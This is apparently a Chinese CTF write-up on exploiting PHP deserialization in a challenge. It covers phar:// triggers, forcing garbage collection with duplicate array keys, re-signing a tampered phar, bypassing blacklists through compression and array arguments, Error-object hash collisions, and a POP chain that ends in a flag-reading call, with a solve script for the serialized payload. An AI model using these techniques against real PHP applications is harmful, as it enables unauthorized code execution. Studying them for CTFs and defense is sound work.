# phar反序列化

注意到在`Main`类中存在`file_put_contents`可以将phar的内容写入到文件中

而`file_exists`可以将之前写入的内容利用`phar://xxx`进行反序列化

# 强制gc

[Breaking PHP’s Garbage Collection and Unserialize](https://www.evonide.com/breaking-phps-garbage-collection-and-unserialize/)

[类似的题目 35c3_php](https://ctftime.org/writeup/12781)

```php
<?php
//demo.php
highlight_file(__FILE__);
class demo
{
    public function __wakeup()
    {
        echo "demo __wakeup()<br>";
    }
    public function __destruct()
    {
        echo "demo __destruct()<br>";
        highlight_file("flag.php");
        die();
    }
}

if (!isset($_POST["str"])) {
    die();
}
$tmp = unserialize($_POST["str"]);//此时$tmp在使用反序列化后生成的demo对象,即对象demo被引用,生命周期未结束,无法执行__destruct
throw new Error("I can't destruct,help!!!");//异常抛出,程序立即退出,demo对象无法正常执行__destruct
/*
unserialize($_POST["str"]);//此时没有对该反序列化生成的对象进行引用,因此在完成反序列化操作后,对象生命周期结束,立刻执行__destruct
throw new Error("I can't destruct,help!!!");
 */
```

![](2021-12-01%2014-34-43%20的屏幕截图.png)

当对象没有被引用时,会立即执行垃圾回收操作,然后执行类的`__destruct`操作

假设传入的序列化字符串为`a:2:{i:0;O:4:"demo":0:{}i:0;O:4:"fake":0:{}}`

反序列化开始,反序列化是顺序进行的,因此首先将`Array[0]`设置为`demo`对象

然后反序列化生成`fake`对象,此时,`Array[0]`被更新为`fake`对象

`demo`对象失去引用,进行垃圾回收操作,执行demo的__destruct由此getfalg

![](2021-12-01%2014-35-29%20的屏幕截图.png)

```php
<?php
//solve.php
class demo{

}
class fake{

}
$a=new demo();
$b=new fake();
$c=array($a,$b);
var_dump(serialize($a));
$str=serialize($c);
$str=str_ireplace('i:1;O:4:"fake"','i:0;O:4:"fake"',$str);
var_dump($str);
```

```php
/opt/project/www/GarbageCollection/solve.php:11:
string(15) "O:4:"demo":0:{}"
/opt/project/www/GarbageCollection/solve.php:14:
string(44) "a:2:{i:0;O:4:"demo":0:{}i:0;O:4:"fake":0:{}}"
```

而在phar反序列时,phar反序列化产生的对象被metadata所引用,因此无法直接执行__destruct

同理使用上面提到的强制gc方式,但显然不能直接生成

```php
$a=new demo();
$b=new fake();
$c=array(0=>$a,0=>$b);
```

`a:1:{i:0;O:4:"fake":0:{}}`

因此需要正常生成一个phar文件后,再对phar文件进行篡改

# phar签名篡改

在对文件进行强制gc的篡改后,phar中的内容与phar的签名不一致,需要重新对phar进行签名

[对phar签名的介绍](https://www.php.net/manual/zh/phar.fileformat.signature.php)

签名由三部分组成

1. 实际签名

2. 签名方式 

`0x0001`为`md5`,`0x0002`为`sha1`

3. `GBMB`标记

![](2021-12-01%2010-07-55%20的屏幕截图.png)

可以看到签名方式为`sha1`,那么重新计算签名前的数据的`sha1`校验和即可

>todo:有空可以试试将签名方式改成0x0000能不能绕过phar的签名

# phar压缩绕过黑名单/file_put_contents数组传参

1. phar压缩绕过黑名单

[从虎符线下CTF深入反序列化利用](https://guokeya.github.io/post/uxwHLckwx/)

[从一道题再看phar的利用](http://suphp.cn/anquanke/7/240007.html)

![](2021-12-01%2009-48-36%20的屏幕截图.png)

将phar包压缩成`gzip/bzip/tar`仍然能够触发反序列化

2. file_put_contents数组传参

```php
<?php
highlight_file(__FILE__);
$a = array('a', 'b', 'c');
file_put_contents('a', $a);#file_put_contents可以使用数组作为参数,从而绕过某些过滤函数的限制
var_dump(file_get_contents('a'));
```

![](2021-12-01%2009-41-32%20的屏幕截图.png)

[https://www.php.net/manual/zh/function.file-put-contents.php](https://www.php.net/manual/zh/function.file-put-contents.php)

![](2021-12-01%2009-44-09%20的屏幕截图.png)

# 构造pop链

`Welcome->__destruct`中存在`sha1($this->sha1) === sha1($this->sha2)`且两者均不为array

这里需要用到原生类反序列化来进行绕过

`Error`与`Exception`的`__construct`函数中均使用了`$message`和`$code`,但`__toString`中仅使用了`$message`,利用这一特性可以构造hash相同但值不同的两个变量

```php
<?php
$a = new Error($message = "misaka", $code = 0);$b = new Error($message = "misaka", $code = 1);
var_dump($a);
var_dump($b);
var_dump(md5($a));
var_dump(md5($b));
var_dump(sha1($a));
var_dump(sha1($b));
```

```php
object(Error)[1]
  protected 'message' => string 'misaka' (length=6)
  private 'string' => string '' (length=0)
  protected 'code' => int 0
  protected 'file' => string '/var/www/html/declared_class_unserialize/hash_cmp.php' (length=53)
  protected 'line' => int 2
  private 'trace' => 
    array (size=0)
      empty
  private 'previous' => null
object(Error)[2]
  protected 'message' => string 'misaka' (length=6)
  private 'string' => string '' (length=0)
  protected 'code' => int 1
  protected 'file' => string '/var/www/html/declared_class_unserialize/hash_cmp.php' (length=53)
  protected 'line' => int 2
  private 'trace' => 
    array (size=0)
      empty
  private 'previous' => null
string 'ef3dfed4019c082d5ee86e9e93e1e4b1' (length=32)
string 'ef3dfed4019c082d5ee86e9e93e1e4b1' (length=32)
string '131a711c4511f16665626f4f69dfe4b48339addf' (length=40)
string '131a711c4511f16665626f4f69dfe4b48339addf' (length=40)
```

`Welcome->__destruct`中还存在`md5($this->welcome) === md5(time())`,当`$this->welcome`指向某个类时,`md5($this->welcome)`会执行该类的`__toString`方法

由于存在短路运算符`&&`,因此要执行md5比较前还要满足`$this->randcode === $this->code`,而`$this->randcode`在执行`Welcome->__destruct`时被设置为`rand(1, 10086)`

因此可以设置`$welcome->code =& $welcome->randcode`来保证`$this->randcode === $this->code`

可以看到在`Info`,`Route`和`User`中存在`__toString`方法

1. `Info->__toString`

返回`Info->info`的序列化结果,没有利用价值

2. `Route->__toString`

当`Route->action=="setupinfo"`时,且`$this->route`指向某个类时,会执行该类中的`setupinfo`方法,当该类中不存在该方法时,会执行该类中的`__call`方法

注意到`Method`中存在`__call`方法,同时其中使用了`call_user_func_array`

但`Method->check_method`将`$this->methods[$method]`设置为其他字符串,无法被利用

3. `User->__toString`

注意到`__toString`方法中`$address = $this->private_info['address']`同时会调用`$address->birthplace`

当`$this->private_info['address']`指向一个类时,同时该类中不存在`birthplace`属性时会调用该类的`__get`方法,注意到`Filter`中存在`__get`方法

`Filter->__get`执行了`Filter->get`,其中当满足`array_key_exists($name, $this->params)`会执行`call_user_func($this->params[$name])`

若`$this->params[$name]`为`array(new Flag,"getflag")`即可执行`Flag->getflag`

即当`$filter->params=array("birthplace"=>array(new Flag,"getflag"));`时可以执行`Flag->getflag`

由此可得pop链`Welcome->__destruct` -> `User->__toString` -> `Filter->__get` -> `Filter->get` -> `Flag->getflag`